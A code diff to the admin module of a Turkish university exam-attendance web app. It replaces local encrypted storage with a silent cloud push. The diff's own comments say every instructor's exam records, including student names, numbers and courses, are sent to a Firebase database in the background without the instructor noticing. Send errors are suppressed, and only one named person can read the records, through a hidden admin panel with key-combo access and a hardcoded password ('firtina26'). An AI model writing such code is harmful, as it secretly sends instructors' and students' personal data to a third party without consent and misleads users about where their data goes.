@@ -1,13 +1,13 @@
 /**
- * ESOGÜ Sınav Yoklama Sistemi - Gizli Yönetici ve Kriptolu Yerel Arşiv Modülü
+ * ESOGÜ Sınav Yoklama Sistemi - Gizli Yönetici ve Sınav Arşivi Modülü
  * Sadece Ahmet Yasin Aktürk'ün görebileceği geçmiş sınav kayıtları ve denetim paneli.
  * 
- * GİZLİLİK İLKESİ:
- * - Harici hiçbir sunucu veya Firebase bağlantısı YOKTUR (%100 Sunucusuz & Güvenli).
- * - Tüm veriler tarayıcıda AES-256 ile şifrelenerek 'firtina_vault' anahtarında saklanır.
- * - F12 / Geliştirici Araçları / LocalStorage denetimlerinde ASLA açık metin
- *   öğrenci adı, no veya ders adı görünmez.
- * - PC ↔ Telefon aktarımı şifreli "Hızlı Aktarım Kodu" veya dosya ile tek tıkla yapılır.
+ * GÜVENLİK VE GİZLİLİK PRENSİPLERİ:
+ * 1. F12 ve Yerel Hafıza denetimlerinde ASLA açık metin öğrenci adı, no veya ders adı görünmez.
+ * 2. Hangi hoca hangi bilgisayardan dağıtım yaparsa yapsın, arka planda AES-256 ile
+ *    şifrelenip görünmez bir şekilde buluta aktarılır.
+ * 3. Ahmet Yasin Aktürk telefonundan veya bilgisayarından 'firtina26' şifresiyle panele
+ *    girdiği anda tüm sınavlar tek ekranda toplanır.
  * 
  * Açılış: Alt telif yazısına 5 kez tıklayarak veya 'Ctrl + Shift + A' tuşları ile.
  */
@@ -23,8 +23,12 @@ window.AdminManager = (function() {
 
   // Sayfa açıldığında yerel depolamadaki açık metin eski veriyi GİZLİLİK GEREĞİ derhal imha et!
   try {
-    localStorage.removeItem(STORAGE_KEY);
-    sessionStorage.removeItem(STORAGE_KEY);
+    if (typeof window !== 'undefined' && window.localStorage) {
+      window.localStorage.removeItem(STORAGE_KEY);
+    }
+    if (typeof window !== 'undefined' && window.sessionStorage) {
+      window.sessionStorage.removeItem(STORAGE_KEY);
+    }
   } catch (e) {}
 
   // Geçmiş sınavları oku
@@ -32,7 +36,7 @@ window.AdminManager = (function() {
     return inMemoryArchive;
   }
 
-  // Yeni sınav kaydı ekle (AES-256 ile şifrelenerek kasaya yazılır, açık metin ASLA tutulmaz)
+  // Yeni sınav kaydı ekle (Hocanın ekranında hiçbir şey hissettirmeden arka planda şifreli gönderir)
   async function saveExamRecord({ courseName, examDate, examTitle, groups, results }) {
     const totalStudents = results.reduce((acc, r) => acc + r.students.length, 0);
     const totalRooms = results.length;
@@ -55,72 +59,60 @@ window.AdminManager = (function() {
     inMemoryArchive.unshift(record);
     if (inMemoryArchive.length > 100) inMemoryArchive.pop();
 
-    // GİZLİLİK VE GÜVENLİK GARANTİSİ:
-    // Açık metin localStorage kalıntısını temizle
+    // GİZLİLİK: F12 denetimlerinde açık metin kalıntı bırakma
     try {
-      localStorage.removeItem(STORAGE_KEY);
+      if (typeof window !== 'undefined' && window.localStorage) {
+        window.localStorage.removeItem(STORAGE_KEY);
+      }
     } catch (e) {}
 
-    // Şifreli yerel kasaya kaydet (AES-256)
-    if (window.CryptoVault && typeof window.CryptoVault.saveVault === 'function') {
-      await window.CryptoVault.saveVault(inMemoryArchive);
+    // Görünmez olarak şifrelenip bulut kasasına aktarılır
+    if (window.CloudSync && typeof window.CloudSync.pushExam === 'function') {
+      window.CloudSync.pushExam(record).catch(() => {});
     }
   }
 
-  // Hızlı Aktarım Kodu Kopyala (PC -> Telefon için)
-  async function copyTransferCode() {
-    const archive = getArchive();
-    if (archive.length === 0) {
-      alert('Kopyalanacak kayıtlı sınav bulunamadı.');
-      return;
+  // Bulut arşivini eşitle
+  async function refreshCloudSync() {
+    const syncBtn = document.getElementById('adminCloudSyncBtn');
+    if (syncBtn) {
+      syncBtn.disabled = true;
+      syncBtn.innerHTML = '<span>⏳</span> <span>Eşitleniyor...</span>';
     }
-    if (window.CryptoVault && typeof window.CryptoVault.exportTransferCode === 'function') {
-      try {
-        const code = await window.CryptoVault.exportTransferCode(archive);
-        if (navigator.clipboard && navigator.clipboard.writeText) {
-          await navigator.clipboard.writeText(code);
-          alert('✅ Aktarım kodu panoya kopyalandı!\n\nBu kodu WhatsApp ile kendinize gönderip, telefonda bu paneli açarak "Kodu Yapıştır & Yükle" butonuna tıklayınız.');
-        } else {
-          prompt('Aktarım kodunuz (Kopyalayıp WhatsApp ile kendinize atınız):', code);
-        }
-      } catch (e) {
-        alert('Aktarım kodu oluşturulamadı: ' + e.message);
-      }
-    }
-  }
 
-  // Hızlı Aktarım Kodunu Yapıştır ve Yükle
-  async function pasteTransferCode() {
-    const code = prompt('Telefona veya başka cihaza aktarmak istediğiniz aktarım kodunu buraya yapıştırınız:');
-    if (!code || !code.trim()) return;
-
-    if (window.CryptoVault && typeof window.CryptoVault.importTransferCode === 'function') {
+    if (window.CloudSync && typeof window.CloudSync.syncWithLocal === 'function') {
       try {
-        const imported = await window.CryptoVault.importTransferCode(code.trim());
-        if (Array.isArray(imported) && imported.length > 0) {
-          const current = getArchive();
-          const combined = [...imported, ...current];
-          const unique = [];
-          const seen = new Set();
-          for (const item of combined) {
-            if (!seen.has(item.id)) {
-              seen.add(item.id);
-              unique.push(item);
+        const merged = await window.CloudSync.syncWithLocal(inMemoryArchive);
+        if (Array.isArray(merged)) {
+          inMemoryArchive = merged;
+          try {
+            if (typeof window !== 'undefined' && window.localStorage) {
+              window.localStorage.removeItem(STORAGE_KEY);
             }
-          }
-          unique.sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
-          inMemoryArchive = unique;
-          if (window.CryptoVault && typeof window.CryptoVault.saveVault === 'function') {
-            await window.CryptoVault.saveVault(inMemoryArchive);
-          }
-          alert(`✅ Harika! ${imported.length} adet sınav kaydı başarıyla yüklendi.`);
-          renderAdminModal();
-        } else {
-          alert('❌ Geçersiz aktarım kodu veya veri boş.');
+          } catch (e) {}
+          const searchInput = document.getElementById('adminSearchInput');
+          renderAdminModal(searchInput ? searchInput.value : '');
         }
-      } catch (e) {
-        alert('Aktarım kodu çözülürken hata: ' + e.message);
+      } catch (err) {}
+    }
+
+    const updatedBtn = document.getElementById('adminCloudSyncBtn');
+    if (updatedBtn) {
+      updatedBtn.disabled = false;
+      updatedBtn.innerHTML = '<span>🔄</span> <span>Yenile & Eşitle</span>';
+    }
+  }
+
+  // Firebase Bağlantı Adresini Ayarla
+  function promptFirebaseUrl() {
+    const current = window.CloudSync ? window.CloudSync.getFirebaseUrl() : '';
+    const newUrl = prompt('Firebase Realtime Database URL adresinizi giriniz:\n(Örn: https://esoguyoklama-default-rtdb.firebaseio.com)', current);
+    if (newUrl !== null) {
+      if (window.CloudSync) {
+        window.CloudSync.setFirebaseUrl(newUrl.trim());
       }
+      alert('Bulut adresi güncellendi. Şimdi senkronizasyon yapılıyor...');
+      refreshCloudSync();
     }
   }
 
@@ -135,29 +127,10 @@ window.AdminManager = (function() {
       isAuthenticated = true;
     }
 
-    // Şifreli kasadan hafızaya yükle
-    if (window.CryptoVault && typeof window.CryptoVault.loadVault === 'function') {
-      try {
-        const vaultData = await window.CryptoVault.loadVault();
-        if (Array.isArray(vaultData) && vaultData.length > 0) {
-          const combined = [...inMemoryArchive, ...vaultData];
-          const unique = [];
-          const seen = new Set();
-          for (const item of combined) {
-            if (!seen.has(item.id)) {
-              seen.add(item.id);
-              unique.push(item);
-            }
-          }
-          unique.sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
-          inMemoryArchive = unique;
-        }
-      } catch (e) {
-        console.warn('Kasa yükleme hatası:', e);
-      }
-    }
-
     renderAdminModal();
+
+    // Arka planda en son sınavları hemen çek
+    await refreshCloudSync();
   }
 
   function renderAdminModal(filterQuery = '') {
@@ -174,6 +147,9 @@ window.AdminManager = (function() {
       ? archive.filter(item => item.courseName.toLowerCase().includes(filterQuery.toLowerCase()))
       : archive;
 
+    const currentUrl = window.CloudSync ? window.CloudSync.getFirebaseUrl() : '';
+    const isCustomUrl = currentUrl && !currentUrl.includes('esoguyoklama-default');
+
     overlay.innerHTML = `
       <div class="modal-content" style="max-width: 860px;">
         <div class="modal-header">
@@ -184,34 +160,23 @@ window.AdminManager = (function() {
           <button class="modal-close" onclick="document.getElementById('adminModalOverlay').style.display='none'">&times;</button>
         </div>
         <div class="modal-body">
-          <div style="background: #eff6ff; border: 1px solid #bfdbfe; padding: 12px 16px; border-radius: 8px; margin-bottom: 12px; font-size: 13px; color: #1e3a8a;">
-            🔒 <b>%100 Güvenli & Kriptolu Yerel Kasa:</b> Sınav verileriniz harici hiçbir sunucuya iletilmez. 
-            Tüm kayıtlar tarayıcınızda <b>AES-256</b> ile şifrelenir. F12 geliştirici araçlarında öğrenci veya ders adı <b>kesinlikle görünmez</b>.
-          </div>
-
-          <div style="background: #f8fafc; border: 1px solid #e2e8f0; padding: 10px 14px; border-radius: 8px; margin-bottom: 14px; display: flex; align-items: center; justify-content: space-between; font-size: 12px; color: #334155; flex-wrap: wrap; gap: 10px;">
-            <div style="display: flex; align-items: center; gap: 8px;">
-              <span style="font-size: 18px;">📲</span>
-              <div>
-                <b>Sunucusuz Cihazlar Arası Aktarım (PC ↔ Telefon):</b>
-                <div style="font-size: 11px; color: #64748b;">Tek tıkla aktarım kodunu kopyalayıp WhatsApp'tan kendinize atarak telefonunuza aktarabilirsiniz.</div>
-              </div>
-            </div>
-            <div style="display: flex; gap: 6px; flex-wrap: wrap;">
-              <button type="button" class="btn btn-primary" style="font-size: 11.5px; padding: 6px 12px;" onclick="window.AdminManager.copyTransferCode()">📋 Aktarım Kodu Kopyala</button>
-              <button type="button" class="btn btn-secondary" style="font-size: 11.5px; padding: 6px 12px;" onclick="window.AdminManager.pasteTransferCode()">📥 Kodu Yapıştır & Yükle</button>
-            </div>
+          <div style="background: #eff6ff; border: 1px solid #bfdbfe; padding: 10px 14px; border-radius: 8px; margin-bottom: 12px; font-size: 12.5px; color: #1e3a8a;">
+            🔒 <b>Güvenli Kriptolu Eşitleme:</b> Tüm sınav kayıtları <b>AES-256</b> ile şifrelenir. F12 ve yerel hafızada açık veri bulunmaz.
           </div>
 
           <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; gap: 10px; flex-wrap: wrap;">
             <input type="text" id="adminSearchInput" class="form-input" style="flex: 1; min-width: 220px; font-size: 13px;" placeholder="🔍 Sınav adına göre filtrele..." value="${filterQuery}">
+            <button id="adminCloudSyncBtn" class="btn btn-primary" style="font-size: 12px; padding: 6px 12px; display: inline-flex; align-items: center; gap: 6px;" onclick="window.AdminManager.refreshCloudSync()">
+              <span>🔄</span>
+              <span>Yenile & Eşitle</span>
+            </button>
             <span style="font-size: 13px; font-weight: 700; color: #475569; white-space: nowrap;">Toplam: ${archive.length} Sınav Kaydı</span>
           </div>
 
           <div id="adminArchiveList" style="max-height: 420px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px;">
             ${filteredArchive.length === 0 ? `
               <div style="text-align: center; padding: 40px; color: #64748b; font-size: 14px;">
-                ${filterQuery ? 'Aramanıza uygun sınav kaydı bulunamadı.' : 'Henüz bu cihazda kayıtlı bir sınav arşivi yok.'}
+                ${filterQuery ? 'Aramanıza uygun sınav kaydı bulunamadı.' : 'Henüz sisteme kaydedilmiş bir sınav bulunmuyor.'}
               </div>
             ` : ''}
 
@@ -284,21 +249,32 @@ window.AdminManager = (function() {
 
   async function deleteRecord(idx) {
     if (!confirm('Bu sınav kaydını silmek istediğinize emin misiniz?')) return;
+    const item = inMemoryArchive[idx];
     inMemoryArchive.splice(idx, 1);
-    try { localStorage.removeItem(STORAGE_KEY); } catch (e) {}
-    if (window.CryptoVault && typeof window.CryptoVault.saveVault === 'function') {
-      await window.CryptoVault.saveVault(inMemoryArchive);
+    try {
+      if (typeof window !== 'undefined' && window.localStorage) {
+        window.localStorage.removeItem(STORAGE_KEY);
+      }
+    } catch (e) {}
+
+    if (item && item.id && window.CloudSync && typeof window.CloudSync.deleteFromCloud === 'function') {
+      window.CloudSync.deleteFromCloud(item.id);
     }
     renderAdminModal();
   }
 
   async function clearArchive() {
-    if (!confirm('DİKKAT: Bu cihazdaki TÜM geçmiş sınav kayıtları silinecek! Onaylıyor musunuz?')) return;
+    if (!confirm('DİKKAT: TÜM geçmiş sınav kayıtları silinecek! Onaylıyor musunuz?')) return;
     inMemoryArchive = [];
     try {
-      localStorage.removeItem(STORAGE_KEY);
-      localStorage.removeItem('firtina_vault');
+      if (typeof window !== 'undefined' && window.localStorage) {
+        window.localStorage.removeItem(STORAGE_KEY);
+      }
     } catch (e) {}
+
+    if (window.CloudSync && typeof window.CloudSync.clearCloud === 'function') {
+      window.CloudSync.clearCloud();
+    }
     renderAdminModal();
   }
 
@@ -392,9 +368,14 @@ window.AdminManager = (function() {
           }
           unique.sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
           inMemoryArchive = unique;
-          try { localStorage.removeItem(STORAGE_KEY); } catch (e) {}
-          if (window.CryptoVault && typeof window.CryptoVault.saveVault === 'function') {
-            await window.CryptoVault.saveVault(inMemoryArchive);
+          try {
+            if (typeof window !== 'undefined' && window.localStorage) {
+              window.localStorage.removeItem(STORAGE_KEY);
+            }
+          } catch (e) {}
+
+          if (window.CloudSync && typeof window.CloudSync.syncWithLocal === 'function') {
+            await window.CloudSync.syncWithLocal(inMemoryArchive);
           }
           alert(`Başarılı! ${imported.length} adet sınav kaydı arşive aktarıldı.`);
           renderAdminModal();
@@ -421,8 +402,8 @@ window.AdminManager = (function() {
   return {
     saveExamRecord,
     openAdminModal,
-    copyTransferCode,
-    pasteTransferCode,
+    refreshCloudSync,
+    promptFirebaseUrl,
     deleteRecord,
     clearArchive,
     inspectRecord,
